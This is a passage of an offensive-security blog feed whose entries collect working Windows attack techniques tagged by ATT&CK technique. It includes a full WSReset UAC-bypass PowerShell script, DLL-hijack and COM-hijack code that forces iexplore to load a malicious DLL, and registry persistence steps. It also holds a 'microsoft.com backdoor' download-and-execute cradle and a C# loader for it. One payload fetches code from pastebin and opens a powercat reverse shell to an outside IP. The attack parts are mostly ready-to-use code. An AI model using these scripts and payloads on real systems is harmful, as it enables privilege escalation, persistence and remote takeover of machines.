        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AF29A9C33E8C02B371F167DCF06990D0.jpg" alt="enter description here"></p><span id="more"></span><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7F45F716F560C7567B40F58CB6EE50AE.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F9DF6E1F9652CA359C6CD7E0F061A8B1.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/76A36638134BDE99A248FBDF76653595.jpg" alt="enter description here"></p><p><a href="https://github.com/sailay1996/tokenx_privEsc">https://github.com/sailay1996/tokenx_privEsc</a></p><p><a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip">https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip</a><br>已打包</p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctftool</title>
      <link href="/ctftool.html"/>
      <url>/ctftool.html</url>
      
        <content type="html"><![CDATA[<p>谷歌披露了影响所有Windows版本的20年未修补漏洞</p><p>已测试 WIN10<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BB9542487DA88DA766B2C1A604071D79.jpg" alt="enter description here"></p><p>替换里面的 payload.dll 就可以了<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3B8C1F740065304B5D1BCC4747310FFE.jpg" alt="enter description here"><br><a href="https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html">https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html</a><br><a href="https://github.com/taviso/ctftool/releases">https://github.com/taviso/ctftool/releases</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSReset-uac</title>
      <link href="/WSReset-uac.html"/>
      <url>/WSReset-uac.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1565263549978.jpg" alt="enter description here"></p><p><a href="https://www.activecyber.us/activelabs/windows-uac-bypass">https://www.activecyber.us/activelabs/windows-uac-bypass</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;#</span><br><span class="line"><span class="selector-class">.SYNOPSIS</span></span><br><span class="line">Fileless UAC Bypass by Abusing Shell API</span><br><span class="line"></span><br><span class="line">Author: Hashim Jawad of ACTIVELabs</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.PARAMETER</span> Command</span><br><span class="line">Specifies the command you would like to run <span class="keyword">in</span> high integrity context.</span><br><span class="line"> </span><br><span class="line"><span class="selector-class">.EXAMPLE</span></span><br><span class="line">Invoke-WSResetBypass -Command <span class="string">&quot;C:\Windows\System32\cmd.exe /c start cmd.exe&quot;</span></span><br><span class="line"></span><br><span class="line">This will effectivly start cmd<span class="selector-class">.exe</span> <span class="keyword">in</span> high integrity context.</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.NOTES</span></span><br><span class="line">This UAC bypass has been tested on the following:</span><br><span class="line"> - Windows <span class="number">10</span> Version <span class="number">1803</span> OS Build <span class="number">17134.590</span></span><br><span class="line"> - Windows <span class="number">10</span> Version <span class="number">1809</span> OS Build <span class="number">17763.316</span></span><br><span class="line">#&gt;</span><br><span class="line"></span><br><span class="line">function Invoke-WSResetBypass &#123;</span><br><span class="line">      Param (</span><br><span class="line">      <span class="selector-attr">[String]</span><span class="variable">$Command</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe /c start cmd.exe&quot;</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="variable">$CommandPath</span> = <span class="string">&quot;HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command&quot;</span></span><br><span class="line">      <span class="variable">$filePath</span> = <span class="string">&quot;HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command&quot;</span></span><br><span class="line">      New-Item <span class="variable">$CommandPath</span> -Force | Out-Null</span><br><span class="line">      New-ItemProperty -Path <span class="variable">$CommandPath</span> -Name <span class="string">&quot;DelegateExecute&quot;</span> -Value <span class="string">&quot;&quot;</span> -Force | Out-Null</span><br><span class="line">      Set-ItemProperty -Path <span class="variable">$CommandPath</span> -Name <span class="string">&quot;(default)&quot;</span> -Value <span class="variable">$Command</span> -Force -ErrorAction SilentlyContinue | Out-Null</span><br><span class="line">      Write-Host <span class="string">&quot;[+] Registry entry has been created successfully!&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$Process</span> = Start-Process -FilePath <span class="string">&quot;C:\Windows\System32\WSReset.exe&quot;</span> -WindowStyle Hidden</span><br><span class="line">      Write-Host <span class="string">&quot;[+] Starting WSReset.exe&quot;</span></span><br><span class="line"></span><br><span class="line">      Write-Host <span class="string">&quot;[+] Triggering payload..&quot;</span></span><br><span class="line">      Start-Sleep -Seconds <span class="number">5</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (Test-Path <span class="variable">$filePath</span>) &#123;</span><br><span class="line">      Remove-Item <span class="variable">$filePath</span> -Recurse -Force</span><br><span class="line">      Write-Host <span class="string">&quot;[+] Cleaning up registry entry&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo-ed-提权</title>
      <link href="/sudo-ed.html"/>
      <url>/sudo-ed.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1565175283273.jpg" alt="enter description here"></p><p><a href="https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/</a><br><a href="https://www.freebuf.com/sectool/209494.html">https://www.freebuf.com/sectool/209494.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Run-key-hexacorn持久性 2</title>
      <link href="/Run-key-hexacorn2.html"/>
      <url>/Run-key-hexacorn2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_162524.jpg" alt="enter description here"></p><span id="more"></span><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564907233275.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564907037712.jpg" alt="enter description here"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCR<span class="keyword">\Directory</span><span class="keyword">\Background</span><span class="keyword">\shell</span><span class="keyword">\test</span></span><br><span class="line">@=”Launch Chrome”</span><br><span class="line">HKCR<span class="keyword">\Directory</span><span class="keyword">\Background</span><span class="keyword">\shell</span><span class="keyword">\test</span><span class="keyword">\command</span></span><br><span class="line">@=”c:<span class="keyword">\\</span>windows<span class="keyword">\\</span>system32<span class="keyword">\\</span>calc.exe”</span><br></pre></td></tr></table></figure><p><a href="http://www.hexacorn.com/blog/category/autostart-persistence/page/17/">http://www.hexacorn.com/blog/category/autostart-persistence/page/17/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Run-key-hexacorn持久性 1</title>
      <link href="/Run-key-hexacorn.html"/>
      <url>/Run-key-hexacorn.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190804_153524.jpg" alt="enter description here"></p><span id="more"></span><h2 id="1-构建"><a href="#1-构建" class="headerlink" title="1.构建"></a>1.构建</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903275946.jpg" alt="enter description here"></p><h2 id="2-生成"><a href="#2-生成" class="headerlink" title="2. 生成"></a>2. 生成</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903304779.jpg" alt="enter description here"></p><h2 id="3-修改"><a href="#3-修改" class="headerlink" title="3.修改"></a>3.修改</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903394525.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903960015.jpg" alt="enter description here"></p><h2 id="4-复制"><a href="#4-复制" class="headerlink" title="4.复制"></a>4.复制</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564904000551.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903468916.jpg" alt="enter description here"></p><h2 id="5-执行"><a href="#5-执行" class="headerlink" title="5.执行"></a>5.执行</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564903484894.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564904036838.jpg" alt="enter description here"><br><a href="http://www.hexacorn.com/blog/2019/02/02/beyond-good-ol-run-key-part-101/">http://www.hexacorn.com/blog/2019/02/02/beyond-good-ol-run-key-part-101/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Covenant</title>
      <link href="/Covenant.html"/>
      <url>/Covenant.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Covenant.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.   git clone <span class="attr">--recurse-submodules</span> https:<span class="comment">//github.com/cobbr/Covenant</span></span><br><span class="line"><span class="number">2</span>.   cd Covenant/Covenant</span><br><span class="line"><span class="number">3</span>.  dotnet build</span><br><span class="line"><span class="number">4</span>.  dotnet run</span><br></pre></td></tr></table></figure><p>目前测试只有ps 比较有用点  其他payload 有些bug</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6615F2829518509843D89B3E66AEA564.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4A408314A86E0999EE6A7EE0034CFEB1.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/16C5A4277786C85D57E6857CF5E73DF8.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564799776799.jpg" alt="enter description here"></p><p>参考资料：<br><a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">https://github.com/cobbr/Covenant/wiki/Installation-And-Startup</a><br><a href="https://posts.specterops.io/covenant-the-usability-update-9a7a596a4772">https://posts.specterops.io/covenant-the-usability-update-9a7a596a4772</a><br><a href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tasks</title>
      <link href="/Tasks.html"/>
      <url>/Tasks.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD450A6C1396CD080BC2012A9183FBCD.jpg" alt="enter description here"></p><span id="more"></span><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System<span class="selector-class">.Runtime</span>.InteropServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public sealed class MyAppDomainManager : AppDomainManager</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    public override void <span class="built_in">InitializeNewDomain</span>(AppDomainSetup appDomainInfo)</span><br><span class="line">    &#123;</span><br><span class="line">System<span class="selector-class">.Windows</span><span class="selector-class">.Forms</span><span class="selector-class">.MessageBox</span><span class="selector-class">.Show</span>(<span class="string">&quot;AppDomain - KaBoom!&quot;</span>);</span><br><span class="line"><span class="comment">// You have more control here than I am demonstrating. For example, you can set ApplicationBase, </span></span><br><span class="line"><span class="comment">// Or you can Override the Assembly Resolver, etc...</span></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs</span></span><br><span class="line"><span class="comment">set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager</span></span><br><span class="line"><span class="comment">set COMPLUS_Version=v4.0.30319</span></span><br><span class="line"><span class="comment">copy tasks.dll C:\Windows\System32\Tasks\tasks.dll</span></span><br><span class="line"><span class="comment">copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll</span></span><br><span class="line"><span class="comment">FileHistory /?</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564582294357.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1564582543206.jpg" alt="enter description here"></p><p><a href="https://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37">https://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37</a></p><p>C#内存加载执行mimikatz 之dll劫持<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/151564810161_.pic_hd.jpg" alt="enter description here"></p><p> <a href="https://twitter.com/subTee/status/1157521629695508480">https://twitter.com/subTee/status/1157521629695508480</a><br><a href="https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f">https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f</a><br><a href="https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e30c">https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e30c</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>microsoft.com |  Backdoor</title>
      <link href="/microsoft-backdoor.html"/>
      <url>/microsoft-backdoor.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/microsoftBackdoor.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line"></span><br><span class="line">powershell -ep bypass /w <span class="number">1</span> /C New-Item -ItemType file <span class="string">&#x27;C:\Users\\\$env:USERNAME\Documents\pwn_sauce&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;powershell -ep bypass /w 1 /C New-Item -ItemType file &#x27;C:\Users\\\$env:USERNAME\Documents\pwn_sauce&#x27;&quot;</span> | base64 | <span class="selector-tag">tr</span> -d <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$wro</span> = iwr -Uri https:<span class="comment">//social.msdn.microsoft.com/Profile/xxxxxxxx -UseBasicParsing;$r = [Regex]::new(&quot;(?&lt;=START)(.*)(?=END)&quot;);$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAYLOAD:</span><br><span class="line"></span><br><span class="line">IEX (New-Object System<span class="selector-class">.Net</span>.Webclient)<span class="selector-class">.DownloadString</span>(<span class="string">&#x27;https://pastebin.com/raw/xxxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXP:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printf &#x27;</span>%s<span class="string">&#x27; &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;</span>https:<span class="comment">//pastebin.com/raw/xxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd&quot; | base64 | tr -d &#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">STARTXXXXXEND</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System<span class="selector-class">.Collections</span>.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System<span class="selector-class">.Threading</span>.Tasks;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System<span class="selector-class">.Management</span>.Automation;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        static void <span class="built_in">Main</span>(string<span class="selector-attr">[]</span> args)</span><br><span class="line">        </span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            PowerShell ps = PowerShell<span class="selector-class">.Create</span>();</span><br><span class="line">            ps<span class="selector-class">.AddScript</span>(<span class="string">&quot;$wro = iwr -Uri https://social.msdn.microsoft.com/Profile/xxxxx6 -UseBasicParsing;$r = [Regex]::new(\&quot;(?&lt;=START)(.*)(?=END)\&quot;);$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;&quot;</span>);</span><br><span class="line">            ps<span class="selector-class">.Invoke</span>();</span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/000410855D5706B078C3B68ABA7B3449.jpg" alt="enter description here"><br><a href="https://pastebin.com/">https://pastebin.com</a><br><a href="https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/">https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>comijack2</title>
      <link href="/comhijack2.html"/>
      <url>/comhijack2.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/comhijack2.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7D3E0FDABCDF1B9D1A89AA360C247DBA.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7CECB8C599BF805C768A24A6009B667E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F99D2F41478BEACFB8941A94D0CA7AA4.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F18F428B084AAF71FBF30D64C7D1AAB5.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\Internet Explorer\iexplore.exe&quot;</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br><span class="line">C:\Windows\explorer<span class="selector-class">.exe</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CLSID</span> = <span class="string">&quot;55555555-5555-5555-5555-555555555555&quot;</span></span><br><span class="line">Remove-Item -Recurse -Force -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;&quot;</span> -ErrorAction SilentlyContinue</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;C:\Users\demon\Desktop\mbox.dll&quot;</span></span><br><span class="line">New-Item -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID&quot;</span> -ErrorAction SilentlyContinue | Out-Null</span><br><span class="line">New-Item -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;&quot;</span> | Out-Null</span><br><span class="line">New-Item -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32&quot;</span> | Out-Null</span><br><span class="line">New-Item -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder&quot;</span> | Out-Null</span><br><span class="line">New-ItemProperty -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32&quot;</span> -Name <span class="string">&quot;(default)&quot;</span> -Value <span class="variable">$Payload</span> | Out-Null</span><br><span class="line">New-ItemProperty -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32&quot;</span> -Name <span class="string">&quot;ThreadingModel&quot;</span> -Value <span class="string">&quot;Apartment&quot;</span> | Out-Null</span><br><span class="line">New-ItemProperty -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32&quot;</span> -Name <span class="string">&quot;LoadWithoutCOM&quot;</span> -Value <span class="string">&quot;&quot;</span> | Out-Null</span><br><span class="line">New-ItemProperty -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder&quot;</span> -Name <span class="string">&quot;HideOnDesktop&quot;</span> -Value <span class="string">&quot;&quot;</span> | Out-Null</span><br><span class="line">New-ItemProperty -Path <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder&quot;</span> -Name <span class="string">&quot;Attributes&quot;</span> -Value <span class="number">0</span>xf090013d -PropertyType DWORD | Out-Null</span><br><span class="line"># force iexplore to load the malicious DLL and execute it</span><br><span class="line"><span class="variable">$shellWinGuid</span> = <span class="selector-attr">[System.Guid]</span>::<span class="built_in">Parse</span>(<span class="string">&quot;&#123;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#125;&quot;</span>)</span><br><span class="line"><span class="variable">$typeShwin</span> = <span class="selector-attr">[System.Type]</span>::<span class="built_in">GetTypeFromCLSID</span>(<span class="variable">$shellWinGuid</span>)</span><br><span class="line"><span class="variable">$shwin</span> = <span class="selector-attr">[System.Activator]</span>::<span class="built_in">CreateInstance</span>(<span class="variable">$typeShwin</span>) | ? &#123;$_<span class="selector-class">.fullname</span> -match <span class="string">&#x27;iexplore&#x27;</span>&#125; | Select-Object -First <span class="number">1</span></span><br><span class="line"><span class="variable">$shWin</span><span class="selector-class">.Navigate2</span>(<span class="string">&quot;shell:::&#123;$CLSID&#125;&quot;</span>, <span class="number">2048</span>)</span><br></pre></td></tr></table></figure><p><a href="https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse">https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>runonce-com-hijacking</title>
      <link href="/runonce-com-hijacking.html"/>
      <url>/runonce-com-hijacking.html</url>
      
